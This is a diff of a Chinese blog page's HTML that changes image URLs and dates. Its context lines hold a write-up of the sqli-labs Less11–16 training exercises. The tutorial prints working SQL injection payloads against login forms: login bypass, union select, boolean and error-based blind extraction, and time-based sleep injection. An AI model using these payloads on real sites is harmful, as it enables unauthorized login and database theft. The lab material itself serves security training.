@@ -27,22 +27,22 @@
 <meta property="og:site_name" content="Hzktester&#96;s Blog">
 <meta property="og:description" content="Less11这一关开始使用post注入，什么是post注入呢？   就是数据从客户端提交到服务器端，例如我们在登录过程中，输入用户名和密码，用户名和密码以表单的形式提交，提交到服务器后服务器再进行验证。这就是一次 post 的过程的。  当我们输入 12username:admin&#39;Password:ddd(任意值)  显示错误了，可以从错误中分析到程序对参数进行单引号的处理。这里我们可以">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100404.png">
-<meta property="og:image" content="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100405.png">
-<meta property="og:image" content="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100406.png">
-<meta property="og:image" content="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100407.png">
-<meta property="og:image" content="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100408.png">
-<meta property="og:image" content="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100409.png">
-<meta property="og:image" content="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100410.png">
-<meta property="og:image" content="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100411.png">
-<meta property="og:image" content="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100412.png">
-<meta property="og:image" content="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100413.png">
+<meta property="og:image" content="https://qiniu.hzktester.top/tp2020100404.png">
+<meta property="og:image" content="https://qiniu.hzktester.top/tp2020100405.png">
+<meta property="og:image" content="https://qiniu.hzktester.top/tp2020100406.png">
+<meta property="og:image" content="https://qiniu.hzktester.top/tp2020100407.png">
+<meta property="og:image" content="https://qiniu.hzktester.top/tp2020100408.png">
+<meta property="og:image" content="https://qiniu.hzktester.top/tp2020100409.png">
+<meta property="og:image" content="https://qiniu.hzktester.top/tp2020100410.png">
+<meta property="og:image" content="https://qiniu.hzktester.top/tp2020100411.png">
+<meta property="og:image" content="https://qiniu.hzktester.top/tp2020100412.png">
+<meta property="og:image" content="https://qiniu.hzktester.top/tp2020100413.png">
 <meta property="article:published_time" content="2020-10-04T15:29:00.000Z">
-<meta property="article:modified_time" content="2020-10-15T06:42:31.208Z">
+<meta property="article:modified_time" content="2020-10-19T13:01:03.333Z">
 <meta property="article:author" content="hzktester">
 <meta property="article:tag" content="sqli-labs">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100404.png">
+<meta name="twitter:image" content="https://qiniu.hzktester.top/tp2020100404.png">
 
 <link rel="canonical" href="https://hzktester.top/2020/10/04/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess11-16(%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5)/">
 
@@ -239,7 +239,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-15 14:42:31" itemprop="dateModified" datetime="2020-10-15T14:42:31+08:00">2020-10-15</time>
+                <time title="修改时间：2020-10-19 21:01:03" itemprop="dateModified" datetime="2020-10-19T21:01:03+08:00">2020-10-19</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -289,10 +289,10 @@
 </blockquote>
 <p>当我们输入</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin&#39;</span><br><span class="line">Password:ddd(任意值)</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100404.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100404.png" alt="image"></p>
 <p>显示错误了，可以从错误中分析到程序对参数进行单引号的处理。<br>这里我们可以在输入框输入万能密码来尝试一下。</p>
 <p>这里<code>username</code>输入：<code>admin&#39;or&#39;1&#39;=&#39;1#</code>，密码随意</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100405.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100405.png" alt="image"></p>
 <p>返回的正确的结果，那么原因是什么呢？我们在<code>background-1</code>中已经其实提到了，逻辑运算的部分中已经讲解了原理。</p>
 <p>当我们提交<code>username</code>和<code>password</code>后，后台形成的<code>sql</code>语句为</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;admin&#39;or&#39;1&#39;&#x3D;&#39;1# and password&#x3D;&#39;$passwd&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
@@ -301,38 +301,38 @@
 </blockquote>
 <p>这里我们用 union 注入进行尝试：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username：1admin&#39;union select 1,database()#</span><br><span class="line">passwd&#x3D;1（任意密码）</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100406.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100406.png" alt="image"></p>
 <p>可以看到显示了<code>database</code>为<code>security</code>，这是我们比较常用的手法。<br>还可以利用其他的方法进行注入</p>
 <h2 id="Less12"><a href="#Less12" class="headerlink" title="Less12"></a>Less12</h2><p>本关于11不同之处在于，id参数使用了”)过滤。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin&quot;)#</span><br><span class="line">Password:ddd(任意值)</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100407.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100407.png" alt="image"></p>
 <h2 id="Less13"><a href="#Less13" class="headerlink" title="Less13"></a>Less13</h2><p>本关id参数使用了’)过滤。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin&#39;)#</span><br><span class="line">Password:ddd(任意值)</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100408.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100408.png" alt="image"></p>
 <blockquote>
 <p>我们可以明显的看到本关不会显示你的登录信息了，只能给你一个是否登录成功的返回数据。那我们这里可以用下布尔类型的盲注。</p>
 </blockquote>
 <p>猜测数据库第一位:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;)and left(database(),1)&gt;&#39;a&#39;#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100409.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100409.png" alt="image"></p>
 <p>登录成功，就这样可以挨着对每一位进行测试，<code>less5</code>中我们已经讲到了这个过程了，这里就不重复了。</p>
 <blockquote>
 <p>在按位进行猜解的过程中，可以利用二分法，可以有效的降低尝试次<br>数</p>
 </blockquote>
 <h2 id="Less14"><a href="#Less14" class="headerlink" title="Less14"></a>Less14</h2><p>本关id参数使用了”过滤。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&quot;#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100410.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100410.png" alt="image"></p>
 <p>登录成功，同样没有输入结果，这里使用报错盲注演示一下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&quot;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100411.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100411.png" alt="image"></p>
 <p>可以看到报错了，显示版本信息</p>
 <h2 id="Less15"><a href="#Less15" class="headerlink" title="Less15"></a>Less15</h2><p>本关id参数使用了’过滤，且没有错误提示，那么我们只能靠猜测进行盲注。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))#&amp;passwd&#x3D;11&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100412.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100412.png" alt="image"></p>
 <p>正确的时候可以直接登录，不正确的时候延时 5 秒。其他payload参考Less9</p>
 <h2 id="Less16"><a href="#Less16" class="headerlink" title="Less16"></a>Less16</h2><p>本关和Less15的处理方法是一样的，同样使用延时注入的方法进行解决。不同的是id参数使用了”)的处理</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&quot;)and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))#&amp;passwd&#x3D;11&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020100413.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020100413.png" alt="image"></p>
 <p>正确的时候可以直接登录，不正确的时候延时 5 秒。其他payload参考Less9</p>
 
     </div>
